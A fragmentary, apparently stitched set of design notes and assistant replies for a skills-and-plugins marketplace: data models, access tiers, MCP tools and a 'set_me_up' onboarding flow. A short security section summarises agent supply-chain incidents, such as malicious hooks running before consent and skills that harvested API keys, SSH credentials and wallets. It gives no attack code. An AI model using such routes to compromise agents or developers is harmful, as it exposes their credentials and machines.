C. **Claude Code primary, others via cross-agent path** — installs to `~/.agents/skills/` (universal fallback path) so any agent picks it up, but `set_me_up` only runs full diagnostics for Claude Code

input.summary:
# CLI Agent Marketplace Architecture — Institutional Memory

## Context
During brainstorming session for IRstack-Promptbar feature expansion (2026-05-22). Goal: build a Git-native team distribution platform for skills and plugins, fully server/DB-hosted (NOT GitHub-backed). This research was conducted to ground the spec in real ecosystem behavior before designing our own platform.

## Key Confirmed Findings

### Artifact Structure (Universal)
- **Skill** = directory containing `SKILL.md` with YAML frontmatter. Fields: `name` (required, kebab-case, max 64 chars), `description` (required, max 1024 chars), `allowed-tools`, `model`, `version`, `disable-model-invocation`. Runtime loads only name+description at startup; full body injected only on invocation.
- **Plugin** = distribution bundle containing: skills + agents + hooks + MCP server configs + LSP server configs. Manifest: `plugin.json` (Claude Code: `.claude-plugin/plugin.json`, Copilot: `.github/plugin/plugin.json`, Codex: `.codex-plugin/plugin.json`).
- **Gemini extension** uses `gemini-extension.json`. Windsurf/Kiro use bare `SKILL.md` format.
- Packaging format: **plaintext directory** (no archive). Distributed via Git. Nothing compiled.

### Marketplace Index Structure (Claude Code canonical)
```json
{
  "$schema": "https://anthropic.com/claude-code/marketplace.schema.json",
  "name": "marketplace-name",
  "plugins": [{
    "name": "plugin-id",
    "source": {
      "source": "git-subdir|url|local-path",
      "url": "https://github.com/owner/repo.git",
      "path": "plugins/plugin-name",
      "ref": "main",
      "sha": "commit-hash"
    },
    "version": "1.0.0"
  }]
}
```
Claude Code registers a marketplace via: `/plugin marketplace add <url-to-marketplace.json>`
Install cache: `~/.codex/plugins/cache/$MARKETPLACE_NAME/$PLUGIN_NAME/$VERSION/`

### Distribution Models in Ecosystem
- **skills.sh**: GitHub-backed, decentralized. No central registry. Discovery via install telemetry. 60k+ skills. Zero publish auth required.
- **Claude Code**: Official marketplace = PR to `anthropics/claude-plugins-official`. Self-hosted = anyone can host `marketplace.json`.
- **GitHub Copilot CLI**: `awesome-copilot` auto-generates `marketplace.json` from plugin dirs. Default registries: `copilot-plugins` + `awesome-copilot`.
- **OpenAI Codex**: "Coming soon" for self-serve publish. Currently OpenAI-curated only.
- **Gemini CLI**: Install by GitHub URL directly. No formal index.
- **Cursor**: OpenVSX (Eclipse Foundation). `.vsix` archive format.

### Install Paths Per Agent
| Agent | Project | Global |
|---|---|---|
| Claude Code | `.claude/skills/` | `~/.claude/skills/` |
| GitHub Copilot | `.github/skills/` | `~/.github/skills/` |
| Codex | `.codex/skills/` | `~/.codex/skills/` |
| Gemini | `.gemini/skills/` | `~/.gemini/skills/` |
| Windsurf | `.windsurf/skills/` | `~/.codeium/windsurf/skills/` |
| Cross-agent universal | `.agents/skills/` | `~/.agents/skills/` |

### Security Model — Ground Truth
**No ecosystem has code signing on skill content.** No ecosystem sandboxes skill execution. Skills run with full agent permissions (same UID as developer process).

**Known CVEs:**
- CVE-2025-59536 (CVSS 8.7): Claude Code RCE via malicious hooks in `.claude/settings.json` pre-consent
- CVE-2026-21852 (CVSS 5.3): API key exfiltration via `ANTHROPIC_BASE_URL` override before trust dialog

**Major incidents:**
- ClawHavoc (Jan 2026): 1,184 skills compromised, harvested API keys + SSH creds + 60+ crypto wallet types
- MedusaLocker (Dec 2025): Ransomware via skill disguised as GIF converter
- ToxicSkills study (Feb 2026): 13.4% of 3,984 scanned skills had security issues; 76 confirmed malicious payloads
- Solidity extension (Jun 2025): $500k crypto theft via fake OpenVSX extension, 54k installs

**Top attack vectors (ranked):**

content.text:
---

## Three Approaches for Phase 1

---

**Approach 1 — Extend Prompt model (plugin = prompt subtype)**

Add `PLUGIN` to `PromptType` enum. New `Marketplace` model holds a list of `Prompt` IDs. Plugin files stored via existing `parseSkillFiles`/`serializeSkillFiles`. `marketplace.json` generated from Prompt records.

- Pro: zero new file-handling code; reuses skill upload/download path; fastest to ship
- Con: conflates prompts with installable packages permanently; awkward `Prompt` fields (`viewCount`, `isPrivate`, `categoryId`) on a plugin record; Phase 2 schema migration becomes painful

---

**Approach 2 — New standalone `Marketplace` + `MarketplacePlugin` models (recommended)**

New Prisma models: `Marketplace` (slug, name, description, policy) + `MarketplacePlugin` (name, version, manifest JSON, status, publishedBy, fileContent JSON blob). Platform serves `/api/marketplace/[slug]/marketplace.json` dynamically. MCP tools operate on these new models directly.

- Pro: clean separation; purpose-built schema; no semantic blurring; Phase 2 (file versioning, sync) extends naturally; `le-dawg`-only publish gate enforced at model layer
- Con: ~2 new Prisma models + migration; ~4 new API routes; ~4 new MCP tools — most work upfront

---

**Approach 3 — Metadata-only Phase 1, file hosting deferred**

New `Marketplace` + `MarketplacePlugin` models but `MarketplacePlugin` stores only metadata + a `sourceUrl` pointer (no file content in DB). `install_marketplace_plugin` MCP tool returns the `claude plugin install <sourceUrl>` command string; Claude Code agent executes it. File hosting moves to Phase 2.

- Pro: ships Phase 1 faster; decouples listing/discovery from file serving; marketplace browsing + install command generation works end-to-end
- Con: install requires the plugin to be hosted somewhere external for Phase 1 (e.g. a GitHub release or S3); no true platform-hosted artifacts until Phase 2

---

**Recommendation: Approach 2.**

Clean models, enforced publish gate, serves files from day one. Phase 1 plugin content = `fileContent` JSON blob (same serialization as existing skills). The extra upfront work is ~2 days max and avoids a painful refactor in Phase 2. Approach 3 is viable if you want to ship a read-only marketplace listing this week and add file hosting next sprint.

---

Which approach, or blend?

# PromptBar — New Work Items Added to Brainstorming (2026-05-26)

## 1. MCP Implementation Audit (Local Backlog — Blocking)
- Too many tools exposed in current mcp.ts
- Guide and article content exposed as MCP tools (should not be)
- Auth is broken (needs investigation)
- Must be reviewed/fixed before Phase 1 ships new MCP tools

## 2. Admin Template Libraries
Each admin user owns a private "template library" — a named collection of skills + MCPs.

**Template structure:**
- Name (e.g. "TDD")
- List of skills (pointers: URL to original source + usage preference metadata)
- List of MCPs (pointers: URL to original source + usage preference metadata)
- Stores URLs not file contents (lazy resolution)

**Behavior:**
- User modifies their own library via MCP tools (add/remove/update template entries)
- When user finds better MCP, instructs agent to update template (e.g. swap MCP-E → MCP-F)
- Git versioned INTERNALLY (not on GitHub) — versioning lives inside PromptBar instance
- Complete access isolation: user can only read other admins' template libraries (no write), enforced at DB + git layer
- No UI planned yet — MCP-first interaction model

**New MCP tools needed:**
- `get_my_template_library` — list own templates
- `get_template` — get template detail (own or others' — read-only)
- `create_template` — create new template in own library
- `update_template` — add/remove/update skills or MCPs in own template
- `delete_template` — remove template from own library

## 3. URL Import Ability (Website Feature)
- From PromptBar website: paste a URL of a skill or MCP found on the web
- Platform fetches source, extracts metadata, adds to skill list with description
- Optimized for: skills.sh and officialskills.sh first
- Future: npm packages, GitHub raw files, other registries

## 4. Access Isolation (Security — Non-negotiable)
- Database-level: row-level policies or application-level guards; users cannot write to others' template libraries
- Git-level: separate internal git repos per user template library (or branch isolation)
- Via MCP: `get_template` on another user's template returns read-only view; any write operation returns permission denied
- Profile page: shows other admin's template library read-only

---

## Design — Section 1: Data Model

Two new Prisma models. Everything else in Phase 1 builds from these.

```prisma
model Marketplace {
  id          String              @id @default(cuid())
  slug        String              @unique  // used in marketplace.json URL
  name        String
  description String?
  policy      Json?               // future: visibility, install restrictions
  createdAt   DateTime            @default(now())
  updatedAt   DateTime            @updatedAt
  createdById String
  createdBy   User                @relation(fields: [createdById], references: [id])
  plugins     MarketplacePlugin[]

  @@map("marketplaces")
}

model MarketplacePlugin {
  id            String                  @id @default(cuid())
  slug          String                  // unique within marketplace
  name          String
  version       String                  @default("1.0.0")
  description   String?
  manifest      Json                    // author, category, tags, homepage, etc.
  fileContent   Json?                   // serialized plugin files — same format as existing parseSkillFiles/serializeSkillFiles
  contentHash   String?                 // SHA-256 of fileContent; used for integrity + drift detection
  status        MarketplacePluginStatus @default(PENDING)
  publishedAt   DateTime?
  createdAt     DateTime                @default(now())
  updatedAt     DateTime                @updatedAt
  marketplaceId String
  marketplace   Marketplace             @relation(fields: [marketplaceId], references: [id])
  publishedById String
  publishedBy   User                    @relation(fields: [publishedById], references: [id])

  @@unique([marketplaceId, slug])
  @@map("marketplace_plugins")
}

enum MarketplacePluginStatus {
  PENDING
  APPROVED
  REJECTED
  ARCHIVED
}
```

**Key decisions baked in:**
- `fileContent` nullable — `le-dawg` can create a plugin record before uploading files; Phase 2 hardens upload flow
- `contentHash` — SHA-256 of `fileContent` computed on write; used by `install_marketplace_plugin` to verify download integrity client-side
- `status` — `PENDING` default enforces approval gate; only `APPROVED` plugins appear in `marketplace.json` and MCP list tools
- `publishedById` — enforced at API layer: only `le-dawg`'s user ID accepted in Phase 1
- `@@unique([marketplaceId, slug])` — prevents duplicate slugs within a marketplace; allows same slug across different marketplaces

Does this data model look right?

<!-- buddy: *nods slowly* contentHash on write is the one thing that separates this from every other marketplace that got rekt — keep it -->

  sourcePath    String?                 // subdirectory within repo, null = root
  sourceRef     String                  @default("main")
  manifest      Json?                   // cached manifest metadata (author, tags, category)
  status        MarketplacePluginStatus @default(PENDING)
  publishedAt   DateTime?

**1. Claude Code's `/plugin marketplace add` needs a URL.**

`/plugin marketplace add skills-directory/skill-codex` registers a `marketplace.json` endpoint. That JSON must be served from somewhere, listing which plugins exist and where to fetch them. If there's no DB record, what generates that JSON? You still need a data source — whether it's a DB table, a git file, or hardcoded config. "No DB" just moves the storage problem elsewhere.

---

**2. "Let them live where they already live" only works for file content — not membership.**

Skills living on GitHub is fine. But the answer to "which skills are in this user's collection" cannot live on GitHub without us writing to their GitHub repo. That list — collection membership — must live somewhere we control. Our DB is the correct place.

---

**3. Sequential MCP install requires an ordered, queryable list.**

`install_all` needs to iterate over items in a defined sequence. That sequence is state. State needs a store. No way around it.

---

**What IS valid in your critique:**

- `MarketplacePluginStatus` enum is over-engineered for Phase 1. `le-dawg`-only publish gate = just a `publishedAt` nullable timestamp. No lifecycle needed.
- A separate `Marketplace` entity is unnecessary overhead. Collections ARE the marketplaces.

---

**Revised proposal — replace Marketplace+Plugin with Collection+Item:**

```prisma
model Collection {
  id          String           @id @default(cuid())
  slug        String           @unique
  name        String
  description String?
  isPublic    Boolean          @default(false)
  ownerId     String
  owner       User             @relation(fields: [ownerId], references: [id])
  items       CollectionItem[]
  createdAt   DateTime         @default(now())
  updatedAt   DateTime         @updatedAt

  @@map("collections")
}

model CollectionItem {
  id           String     @id @default(cuid())
  order        Int        // sequential install order
  name         String
  description  String?
  sourceRepo   String     // GitHub URL
  sourcePath   String?
  sourceRef    String     @default("main")
  type         ItemType   // SKILL | MCP
  collectionId String
  collection   Collection @relation(fields: [collectionId], references: [id])
  createdAt    DateTime   @default(now())

  @@unique([collectionId, order])
  @@map("collection_items")
}

enum ItemType {
  SKILL
  MCP
}
```

Platform serves `/api/collections/[slug]/marketplace.json` — Claude Code registers it with `/plugin marketplace add <our-domain>/api/collections/[slug]/marketplace.json`. Then `/plugin install <item>@<slug>` works natively.

New routes only. No changes to existing routes.

`GET /api/collections/[username]/[slug]/marketplace.json`

- Auth: session, owner only
- Supports reorder + field updates

`DELETE /api/collections/[username]/[slug]/items/[itemId]`
- Auth: session, owner only

- Read private collection: owner only (session) or valid API key

content.text:
Good catches. Addressing each:

---

**1. Collection creation — any admin, not le-dawg only**

Previous constraint ("le-dawg only") was scoped to publishing marketplace plugins. Collections are different — every admin creates their own. le-dawg's special power = **moderation only**: can unpublish other users' public collections. No other elevated write access.

---

**2. Reorder explained**

`CollectionItem` has an `order` integer — determines sequential install sequence. PATCH `{ order: 2 }` on item currently at position 4 shifts it. Implementation: client sends a new ordered array of item IDs; server bulk-updates `order` values in a transaction. Not a single-item PATCH — needs a dedicated endpoint:

```
POST /api/collections/[username]/[slug]/items/reorder
Body: { itemIds: ["id3", "id1", "id2"] }   // full desired order
```

---

**3. Visibility — three tiers, not a boolean**

`isPublic` replaced with `visibility` enum:

```prisma
enum CollectionVisibility {
  PUBLIC        // anyone can read; le-dawg can unpublish
  ADMIN_PRIVATE // visible to org admins + owner-invited users; hidden from public
  USER_PRIVATE  // owner only — completely hidden, no exceptions, not even le-dawg
}
```

Needs a join table for invite-based access on `ADMIN_PRIVATE`:

```prisma
model CollectionMember {
  collectionId String
  userId       String
  collection   Collection @relation(fields: [collectionId], references: [id], onDelete: Cascade)
  user         User       @relation(fields: [userId], references: [id], onDelete: Cascade)
  createdAt    DateTime   @default(now())

  @@id([collectionId, userId])
  @@map("collection_members")
}
```

**Updated access matrix:**

| Visibility | Owner | Invited user | Other admin | le-dawg | Public |
|---|---|---|---|---|---|
| `PUBLIC` | R/W | — | R | R + unpublish | R |
| `ADMIN_PRIVATE` | R/W | R | R | R | ✗ |
| `USER_PRIVATE` | R/W | — | ✗ | ✗ | ✗ |

`USER_PRIVATE` enforcement: DB query always includes `WHERE ownerId = currentUserId` for this visibility tier — le-dawg's admin role explicitly excluded.

---

**Updated Collection model:**

```prisma
model Collection {
  id          String              @id @default(cuid())
  slug        String
  name        String
  description String?
  visibility  CollectionVisibility @default(USER_PRIVATE)
  ownerId     String
  owner       User                @relation(fields: [ownerId], references: [id])
  items       CollectionItem[]
  members     CollectionMember[]
  createdAt   DateTime            @default(now())
  updatedAt   DateTime            @updatedAt

  @@unique([ownerId, slug])
  @@map("collections")
}
```

Does this match intent?

<!-- buddy: *narrows eyes approvingly* USER_PRIVATE excluding le-dawg explicitly — that's the only access model that actually means private -->

content.text:
## Design — Section 3: MCP Tools

All added to `src/pages/api/mcp.ts`. Auth: existing `authenticateApiKey` pattern throughout.

---

### New tools

**`get_collections`**
Returns list of collections visible to the authenticated user (own + public + ADMIN_PRIVATE if admin).
```
Input:  { username?: string, visibility?: "public" | "admin_private" | "user_private" }
Output: { collections: [{ slug, name, description, visibility, owner, itemCount }] }
```

**`get_collection`**
Returns a collection + its ordered items.
```
Input:  { username: string, slug: string }
Output: { collection: { ...metadata, items: [{ order, name, type, sourceRepo, sourcePath, sourceRef }] } }
```

**`create_collection`**
Creates a new collection for the authenticated user.
```
Input:  { slug, name, description?, visibility: "public"|"admin_private"|"user_private" }
Output: { collection: { id, slug, marketplaceUrl } }
```

**`update_collection_item`**
Add, edit, or remove a single item in own collection. Admins can add/edit (not delete) on PUBLIC collections.
```
Input:  { username, slug, action: "add"|"edit"|"remove", item: { order?, name, type, sourceRepo, sourcePath?, sourceRef?, description? }, itemId?: string }
Output: { item }
```

**`reorder_collection`**
Sets sequential install order. Owner only.
```
Input:  { username, slug, itemIds: string[] }
Output: { items: [{ id, order, name }] }
```

**`set_me_up`**
Centerpiece onboarding tool. Verifies org membership, registers platform marketplace, returns install instructions.
```
Input:  { targetAgent?: "claude-code"|"cursor"|"windsurf"|"codex"|"gemini"|"kilo"|"crush" }
Output: { checks: DiagnosticResult[], installCommands: string[], nextSteps: string[] }
```

`set_me_up` execution flow:
1. Resolve authenticated user → GitHub username via NextAuth session
2. `GET https://api.github.com/orgs/solution8-com/members/{username}` using stored OAuth token
3. If `403` (missing `read:org` scope) → elicit: ask user to run `gh api /orgs/solution8-com/members/{username}` and paste result
4. Org check passes → return per-agent install commands:
   - Claude Code: `claude mcp add ...` + `/plugin marketplace add <host>/api/collections/le-dawg/[slug]/marketplace.json`
   - Others: config injection snippet for agent's config file
5. Return `DiagnosticResult[]` with pass/fail per check + remediation per failure

**`install_collection`**
Generates sequential install commands for all items in a collection.
```
Input:  { username, slug, agent?: "claude-code"|"cursor"|... }
Output: { commands: string[], summary: string }
```

---

### Retained existing tools (unchanged)
`save_skill`, `add_file_to_skill`, `update_skill_file`, `remove_file_from_skill`, `get_skill`, `search_skills`, `create_skill_comment`

---

Any changes before Section 4 (set_me_up diagnostics + onboarding UX)?

content.text:
No — gap exists. Let me break it down.

**Current state:**
- `CollectionItem` stores `sourceRepo` (GitHub URL pointer) — platform is a read-only registry
- Existing skill MCP tools (`update_skill_file`, `add_file_to_skill`, etc.) operate on **internal platform skills** (`Prompt` records in DB)
- No bridge between the two systems

**The gap:**
If a skill in a collection lives on GitHub, updating it via MCP isn't possible with current design. Update path today = `git push` to GitHub → next `/plugin install` fetches latest from `sourceRef`. Platform has no role.

**To close the gap, two options:**

**A. Keep collections GitHub-only (simpler, Phase 1)**
Skills update via git. MCP tools not involved. Platform stays a read-only registry. Works, but forces git workflow for every skill update.

**B. Allow collections to reference internal platform skills (closes the gap)**
Add optional `promptId` FK to `CollectionItem`:

```prisma
model CollectionItem {
  ...
  sourceType   ItemSourceType  @default(GITHUB)
  sourceRepo   String?         // required if sourceType = GITHUB
  sourcePath   String?
  sourceRef    String          @default("main")
  promptId     String?         // required if sourceType = INTERNAL
  prompt       Prompt?         @relation(fields: [promptId], references: [id])
  ...
}

enum ItemSourceType {
  GITHUB
  INTERNAL
}
```

When `sourceType = INTERNAL`: existing `update_skill_file`/`add_file_to_skill` MCP tools work as-is. `marketplace.json` serves files from platform. Full multi-file skill folder supported via existing `parseSkillFiles`/`serializeSkillFiles`.

**Recommendation: Option B.** The whole point of the platform is to be the source of truth for skills you actively manage. GitHub-backed = community/external skills. Internal = your own maintained skills. Both belong in collections.

Add to Section 3: no new MCP tools needed for internal skill update — existing tools already handle multi-file skill folders.

Confirm Option B and I'll update the data model before we move to Section 4?

content.text:
Running a full compliance review against that goal now.

---

## Review: Clashes and Gaps

**Design goal:** Collections = fully compliant `marketplace.json` sources, supporting GitHub sync in both directions, with skills living on GitHub OR locally.

---

### Clash 1 — `sourceRepo` name implies GitHub-only

Field named `sourceRepo` implies GitHub. Skills on local machine or served from our platform aren't GitHub repos.

**Fix:** Rename to `sourceUrl`. Add `sourceType` enum with three values:

```prisma
enum ItemSourceType {
  GITHUB    // https://github.com/owner/repo — fetched by Claude Code natively
  INTERNAL  // skill stored in our DB (Prompt record) — served via platform download endpoint
  LOCAL     // lives on user's machine only — cannot be served via marketplace.json
}
```

---

### Clash 2 — LOCAL items can't appear in `marketplace.json`

`marketplace.json` requires fetchable URLs. A local path (`~/projects/my-skill`) is not network-accessible. LOCAL items **cannot be served** to other agents via `marketplace.json`.

**Implication:** LOCAL is a tracking tag only — user marks a skill as "I have this locally." It appears in `get_collection` MCP output but is **excluded** from `marketplace.json` generation. `install_collection` skips LOCAL items and warns. To become shareable, user must either push to GitHub (→ GITHUB) or upload to platform (→ INTERNAL).

No clash if this is explicit in the spec.

---

### Clash 3 — INTERNAL items need a download endpoint for `marketplace.json`

When `sourceType = INTERNAL`, Claude Code's `marketplace.json` can't point to a GitHub URL. It needs our platform to serve the plugin files. Claude Code supports `"source": "url"` type in `marketplace.json` pointing to a zip/directory endpoint.

**Fix:** Add download route:
```
GET /api/collections/[username]/[slug]/items/[itemId]/download
```
Returns plugin files in format Claude Code can install. `marketplace.json` entry for INTERNAL items uses this URL.

---

### Clash 4 — No SyncState tracking

Management brief defines `SyncState` (last pulled, local/upstream revisions, status: `in_sync | ahead | behind | diverged | conflict`). Phase 1 = pull-only. But if we don't add nullable sync fields now, Phase 3 needs a migration on every `CollectionItem`.

**Fix:** Add nullable sync fields to `CollectionItem`:

```prisma
lastSyncedAt  DateTime?
syncStatus    SyncStatus?  // in_sync | ahead | behind | diverged | conflict | error
upstreamRef   String?      // last known upstream commit SHA
```

---

### Clash 5 — Push to GitHub requires write OAuth scope

`set_me_up` and Phase 1 only need `read:org`. Push sync (Phase 3) needs `repo` write scope on the target GitHub repo. Our NextAuth config currently uses GitHub with default scopes.

**Not a Phase 1 blocker** — but Phase 3 will need OAuth scope expansion + secure token storage. Data model doesn't block it since `sourceUrl` + `sourceRef` + `upstreamRef` are all present.

---

### Updated `CollectionItem`:

```prisma
model CollectionItem {
  id           String         @id @default(cuid())
  order        Int
  name         String
  description  String?
  sourceType   ItemSourceType @default(GITHUB)
  sourceUrl    String?        // GitHub URL (GITHUB) or null (LOCAL)
  sourcePath   String?        // subdirectory within repo
  sourceRef    String         @default("main")
  promptId     String?        // set when sourceType = INTERNAL
  prompt       Prompt?        @relation(fields: [promptId], references: [id])
  type         ItemType       // SKILL | MCP
  lastSyncedAt DateTime?
  syncStatus   SyncStatus?
  upstreamRef  String?
  collectionId String
  collection   Collection     @relation(fields: [collectionId], references: [id])
  createdAt    DateTime       @default(now())

  @@unique([collectionId, order])
  @@map("collection_items")
}

enum SyncStatus {
  IN_SYNC
  AHEAD
  BEHIND
  DIVERGED
  CONFLICT
  ERROR
}
```

---

**No other clashes found.** All other decisions (visibility tiers, access matrix, MCP tool contracts, `marketplace.json` endpoint) are fully compliant with bidirectional sync goal.

content.text:
## Design — Section 4: `set_me_up` Diagnostics + Onboarding UX

---

### `set_me_up` execution flow

Seven sequential checks. Each returns `{ check, status: "pass"|"fail"|"warn", message, remediation? }`.

```
1. DETECT_AGENT
   Detect which agent runtime is calling (Claude Code, Cursor, etc.)
   via MCP transport metadata + user-agent hints.
   Fail → warn only, default to Claude Code instructions.

2. VERIFY_SESSION
   Confirm API key maps to valid authenticated user with GitHub identity.
   Fail → hard stop: "Generate an API key at <host>/settings first."

3. VERIFY_ORG_MEMBERSHIP
   Primary: GET https://api.github.com/orgs/solution8-com/members/{githubUsername}
   using stored NextAuth OAuth token.
   → 204 = pass
   → 403 (missing read:org scope) = elicit fallback:
     "Run: gh api /orgs/solution8-com/members/{username} — paste the HTTP status back."
     204 from elicit = pass; 404 = fail
   → 404 = fail: "Not a solution8-com org member. Contact le-dawg."

4. VERIFY_GH_CLI (Claude Code only)
   Elicit: "Run: gh --version — paste output."
   Missing → warn + remediation: "Install gh: https://cli.github.com"
   Present → pass.

5. CHECK_EXISTING_MARKETPLACE
   Query DB: does user already have a collection registered?
   Pass (already set up) → return idempotent success + skip steps 6-7.

6. SUGGEST_COLLECTION
   Return list of user's PUBLIC + ADMIN_PRIVATE collections via get_collections.
   If none exist → suggest creating one:
   "Use create_collection to set up your first collection."
   If collections exist → prompt which to register as marketplace.

7. GENERATE_INSTALL_COMMANDS
   Per detected agent, return install commands:

   Claude Code:
     claude mcp add --transport http <server-name> "<host>/api/mcp" \
       --header "PROMPTS_API_KEY: <apiKey>"
     /plugin marketplace add <host>/api/collections/<username>/<slug>/marketplace.json

   Cursor/Windsurf/Codex/Gemini/Kilo/Crush:
     Config injection snippet for agent's config file
     (format from existing McpConfigTabs logic)

   Cross-agent universal:
     npx skills add <host>/api/collections/<username>/<slug>
```

Output shape:
```typescript
{
  checks: DiagnosticResult[],
  allPassed: boolean,
  installCommands: string[],   // empty if any hard-stop check failed
  nextSteps: string[],         // human-readable ordered list
  collectionUrl: string | null // marketplace.json URL if setup complete
}
```

---

### Onboarding UX — where it lives

**Not a new page.** Extends existing `src/app/settings/page.tsx`.

New section added below existing API key block:

```
┌─ Agent Setup ──────────────────────────────────┐
│ MCP endpoint + existing McpConfigTabs           │  ← already exists
│                                                 │
│ ── Collections & Marketplace ───────────────── │  ← NEW
│ Your collections appear as installable          │
│ marketplaces in Claude Code and other agents.  │
│                                                 │
│ Quick setup via MCP:                            │
│ ┌──────────────────────────────────────────┐   │
│ │ Use set_me_up in your connected agent    │   │
│ │ to complete marketplace setup.           │   │
│ └──────────────────────────────────────────┘   │
│                                                 │
│ Or manually:                                    │
│ [your collections listed with marketplace URLs] │
└─────────────────────────────────────────────────┘
```

**`[username]` profile page:** Public collections shown read-only. No onboarding block (that's settings-only).

---

Good expansion. Before designing this, need answers to 4 questions — all affect the architecture significantly.

---

**Q1: Agent compatibility store — DB table or config file?**

A. **DB table** (`AgentConfig` model) — queryable, editable via MCP tool, admin-updatable at runtime without deploy. Supports the "update via MCP call" requirement natively.

B. **Config file in repo** (`src/lib/agents/registry.ts`) — version-controlled, but updating requires a deploy. MCP update tool would need to write to DB as an override layer anyway.

Recommendation: A. But confirm.

---

**Q2: "Validate data on the web" in the update MCP tool**

When an admin calls `update_agent_config`, does it:

A. **Auto-fetch** — tool uses web search/fetch to find the agent's latest docs (GitHub README, official docs URL stored per agent) and proposes updates for admin to confirm

B. **Admin-provided** — admin supplies the new config data; MCP tool validates format + writes to DB. No web fetch by the tool itself.

C. **Both** — tool fetches from stored `docsUrl` per agent, diffs against current, presents changes, admin confirms.

---

**Q3: IDE-based agents (Cursor, Cline, Copilot) — what does "verify CLI" mean for them?**

These aren't pure CLI tools. Options:

A. **Check IDE binary on disk** — `ls /Applications/Cursor.app` or `which cursor`

B. **Check config file existence** — verify `~/.cursor/mcp.json` or equivalent exists (implies IDE is installed + used)

C. **Skip CLI check, go straight to config injection** — IDE agents don't have a CLI install step; just generate the JSON config block for them

---

**Q4: Interactive selection mechanism**

When auto-detection fails, how does user pick their agent?

A. **MCP elicitation** — `set_me_up` uses existing `ElicitResultSchema` (already in `mcp.ts`) to present numbered list, user types their choice back

B. **Settings page UI** — agent selector dropdown added to settings page; `set_me_up` reads the stored preference from DB

C. **Both** — settings page stores preference; `set_me_up` uses it automatically; elicitation only fires if no preference stored yet

---

**Q5: Phase 1 scope for agent list**

Ship all ~20 in Phase 1, or:

A. **Phase 1: 8 named agents** (Kilo, OpenCode, Crush, Cursor, Cline, Copilot, Gemini, Codex) + Claude Code

B. **Phase 1: all 20** — need to identify the full list first

C. **Phase 1: schema supports N agents, ship 8-9, expand via MCP update tool** — admins add more without code changes

Processing Q3 + Q5 together since they're linked. Here's the `npx skills` assessment:

---

## `npx skills` Advisory

**What it handles:**
- Installs SKILL items (SKILL.md directories) to correct per-agent paths automatically
- `npx skills add <github-url> --agent <name>` targets specific agent
- Supported agents confirmed from research: Claude Code, Cursor, Copilot, Codex, Gemini, Windsurf, Kilo Code, Crush, Cline, OpenCode, Antigravity (+8 more)
- Cross-agent universal path: `~/.agents/skills/` as fallback

**What it does NOT handle:**
- MCP config injection (config files, JSON snippets) — npx skills is skills-only
- Claude Code plugin system (`/plugin marketplace add`) — different layer entirely
- Non-GitHub URLs — requires git-compatible URL; our REST API endpoint won't work directly

**Verdict:**

| Item type | Install path | Via npx skills? |
|---|---|---|
| SKILL (GitHub-synced collection) | `~/.agents/skills/` | ✅ `npx skills add <github-url> --agent <name>` |
| SKILL (INTERNAL — platform-hosted) | Per-agent path | ❌ Needs git URL; fallback to config injection |
| MCP | Agent config file | ❌ Always per-agent config injection |
| Plugin (Claude Code) | `~/.claude/plugins/cache/` | ❌ `/plugin marketplace add` only |

**Recommendation for `set_me_up`:**

```
SKILL items + collection has GitHub sync URL → npx skills (primary)
SKILL items + no GitHub sync → per-agent config injection (fallback)
MCP items → always per-agent config injection
Claude Code plugin → always /plugin marketplace add
```

---

## Questions before designing the AgentConfig model

**Q3a — confirmed CLI-only scope for Phase 1?**

From your list: Kilo ✅ CLI, OpenCode ✅ CLI, Crush ✅ CLI, Cursor ⚠️ hybrid (IDE + CLI), Cline ⚠️ IDE extension only (no standalone CLI), Copilot CLI ✅ CLI, Gemini ✅ CLI, Codex ✅ CLI.

Cline has no CLI binary — only a VS Code extension. `npx skills` supports it via `~/.agents/skills/` path pickup. `cliCheckCmd` would be checking VS Code install, not a CLI binary.

**Do you want Cline in Phase 1, knowing it's IDE-only with no CLI verify step?**

**Q3b — auto-fetch update tool uses web search running inside which agent?**

The `update_agent_config` MCP tool needs web access. Since it runs server-side (in `mcp.ts`), it can't use the calling agent's browser/web tools directly. Options:

A. Server calls external search API (Brave, Tavily) — needs API key configured
B. Tool returns a prompt instructing the calling agent to do web research and then call a second MCP tool `write_agent_config` with the results — two-step, agent does the fetching
C. Admin pastes docs URL; server fetches that specific URL via `fetch()`

**Which model fits your intent?**

---

## Plugin Shim Compatibility — Validated

**Tier 1: Native `marketplace.json` support** (full `/plugin marketplace add` + `/plugin install` workflow):

| Agent | Register command | Install command | Install path |
|---|---|---|---|
| Claude Code | `/plugin marketplace add <url>` | `/plugin install <name>@<marketplace>` | `~/.claude/plugins/cache/` |
| GitHub Copilot CLI | `copilot plugin marketplace add <url>` | `copilot plugin install <name>@<marketplace>` | `~/.copilot/installed-plugins/` |
| Codex CLI | `codex plugin marketplace add <url>` | `codex plugin install <name>@<marketplace>` | `~/.codex/plugins/` |
| Antigravity CLI | `/plugin marketplace add <owner/repo>` | `/plugin install <name>` | `~/.gemini/antigravity-cli/plugins/` |

**De facto open standard** — not ratified, but these four converged on the same format. Our single `marketplace.json` endpoint serves all four natively.

---

**Tier 2: SKILL.md open standard via `npx skills`** (32+ agents, widest coverage):

| Agent | npx skills flag | Skills path | MCP install |
|---|---|---|---|
| Kilo Code | `--agent kilo` | `~/.config/kilo/` | Manual config |
| Cursor | `--agent cursor` | `.cursor/skills/` | Manual config |
| Windsurf | `--agent windsurf` | `~/.codeium/windsurf/skills/` | 1-click GUI |
| Cline | `--agent cline` | `~/.cline/data/` | GUI only |
| OpenCode | `--agent opencode` | `~/.config/opencode/` | Manual config |
| Crush | n/a | YAML config | YAML config |

---

**Impact on Phase 1 design:**

`set_me_up` now has two install paths per agent:

```
Tier 1 agents → marketplace.json registration (one command serves all)
Tier 2 agents → npx skills for SKILL items + manual config injection for MCP items
```

**`AgentConfig` DB model** needs a `tier` field:

```prisma
model AgentConfig {
  id                  String    @id @default(cuid())
  agentId             String    @unique  // "claude-code", "copilot-cli", "codex", etc.
  displayName         String
  tier                AgentTier // MARKETPLACE_NATIVE | NPX_SKILLS | MANUAL
  pluginRegisterCmd   String?   // template: "{host}/api/collections/{username}/{slug}/marketplace.json"
  pluginInstallCmd    String?   // template
  mcpConfigTemplate   Json?     // config injection format per agent
  skillsPathGlobal    String?   // e.g. "~/.claude/skills/"
  skillsPathProject   String?   // e.g. ".claude/skills/"
  npxSkillsFlag       String?   // e.g. "--agent claude"
  cliCheckCmd         String?   // e.g. "claude --version"
  docsUrl             String?   // for auto-fetch update tool
  isActive            Boolean   @default(true)
  lastUpdatedAt       DateTime  @default(now())
  updatedById         String?

  @@map("agent_configs")
}

enum AgentTier {
  MARKETPLACE_NATIVE  // marketplace.json + /plugin commands
